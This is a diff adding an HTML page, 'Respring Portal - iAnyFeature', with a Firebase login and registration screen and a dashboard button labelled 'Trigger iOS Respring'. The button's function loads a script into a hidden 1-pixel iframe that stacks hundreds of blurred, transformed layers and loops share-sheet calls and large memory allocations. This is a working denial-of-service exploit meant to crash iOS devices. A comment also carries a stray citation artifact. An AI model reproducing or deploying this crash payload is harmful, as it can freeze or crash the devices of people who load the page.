@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Respring Portal - iAnyFeature</title>
+    <link rel="icon" href="https://yt3.ggpht.com/UiGTFSl6HLYxGQwsIubau4zxrOlIjlNdLDFJJ_3XTY-Tje0NUBTXGcMb8W2P5Vb2OzOMytFK5Q=s108-c-k-c0x00ffffff-no-rj">
+    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-auth-compat.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f2f2f7; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column;
+        }
+        .header { position: absolute; top: 20px; left: 20px; }
+        .header a { text-decoration: none; color: #007aff; font-weight: bold; }
+        .card {
+            background: white; padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 320px; text-align: center;
+        }
+        h2 { margin-top: 0; color: #1c1c1e; }
+        input {
+            width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd;
+            border-radius: 8px; box-sizing: border-box; outline: none;
+        }
+        button {
+            width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px;
+            background: #007aff; color: white; font-weight: bold; cursor: pointer; transition: 0.3s;
+        }
+        button:hover { filter: brightness(0.9); }
+        .hidden { display: none; }
+        #message { margin-top: 15px; font-size: 14px; color: #ff3b30; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <a href="index.html">← Back to Main Site</a>
+    </div>
+
+    <div class="card" id="auth-section">
+        <h2>Respring Login</h2>
+        <input type="email" id="email" placeholder="Email Address" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="login()">Login</button>
+        <button onclick="register()" style="background: #34c759;">Register</button>
+        <div id="message"></div>
+    </div>
+
+    <div class="card hidden" id="app-section">
+        <h2>Dashboard</h2>
+        <p>Authentication successful.</p>
+        <button onclick="triggerRespring()" style="background: #ff3b30;">Trigger iOS Respring</button>
+        <button onclick="logout()" style="background: #8e8e93;">Logout</button>
+    </div>
+
+    <iframe id="frame" style="width: 1px;height: 1px; border: none;" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBkjcjiwBh1dmEUektJhCHE2nRwjhtCeP4",
+            authDomain: "ianyfeature.firebaseapp.com",
+            projectId: "ianyfeature",
+            storageBucket: "ianyfeature.firebasestorage.app",
+            messagingSenderId: "1007093442879",
+            appId: "1:1007093442879:web:2a3808db49b2f13f008b8a",
+            measurementId: "G-W8CLLBGVMZ"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+
+        // ADD YOUR EMAILJS KEYS HERE:
+        emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+        const emailjsServiceID = "service_jn8hk3h";
+        const emailjsTemplateID = "YOUR_EMAILJS_TEMPLATE_ID";
+
+        const showMsg = (msg, color = "#ff3b30") => {
+            const el = document.getElementById('message');
+            el.innerText = msg; el.style.color = color;
+        };
+
+        const toggleUI = (isLoggedIn) => {
+            document.getElementById('auth-section').classList.toggle('hidden', isLoggedIn);
+            document.getElementById('app-section').classList.toggle('hidden', !isLoggedIn);
+        };
+
+        auth.onAuthStateChanged(user => {
+            if (user && user.emailVerified) toggleUI(true);
+            else toggleUI(false);
+        });
+
+        async function register() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) return showMsg("Please enter email and password.");
+
+            try {
+                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+                await userCredential.user.sendEmailVerification();
+                showMsg("Registration successful! Please check your email to verify your account.", "#34c759");
+                emailjs.send(emailjsServiceID, emailjsTemplateID, { user_email: email });
+            } catch (error) { showMsg(error.message); }
+        }
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            try {
+                const userCredential = await auth.signInWithEmailAndPassword(email, password);
+                if (!userCredential.user.emailVerified) {
+                    showMsg("Please verify your email first.");
+                    auth.signOut();
+                }
+            } catch (error) { 
+                // This detects unexisting accounts or wrong passwords natively
+                showMsg("Login failed: " + error.message); 
+            }
+        }
+
+        function logout() { auth.signOut(); }
+
+        function triggerRespring() {
+            const frame = document.getElementById('frame');
+            const respringScript = `
+                <html>
+                <body>
+                    <script>
+                        const container = document.createElement('div');
+                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                        document.body.appendChild(container);
+                        for (let i = 0; i < 500; i++) {
+                            let d = document.createElement('div');
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                            container.appendChild(d);
+                        }
+                        setInterval(() => {
+                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                            let x = new Uint8Array(1024 * 1024 * 10);
+                            crypto.getRandomValues(x);
+                        }, 0);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            frame.srcdoc = respringScript; //[span_0](start_span)[span_0](end_span)
+        }
+    </script>
+</body>
+</html>
